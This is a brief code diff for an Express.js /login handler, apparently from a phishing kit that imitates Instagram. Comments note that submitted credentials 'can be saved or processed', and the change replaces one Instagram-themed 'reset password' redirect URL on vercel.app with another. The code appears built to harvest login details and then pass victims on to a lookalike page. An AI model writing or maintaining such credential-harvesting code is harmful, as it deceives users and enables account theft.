@@ -29,7 +29,7 @@ app.post('/login', (req, res) => {
 
     // You can save or process the credentials here
     // For demonstration purposes, we will redirect to Instagram
-    res.redirect('https://instagram-resetpassword.vercel.app/'); // Redirect to desired destination
+    res.redirect('https://reset-password-page-2vx2snxvw-defoms-projects.vercel.app/'); // Redirect to desired destination
 });
 
 // Start the server
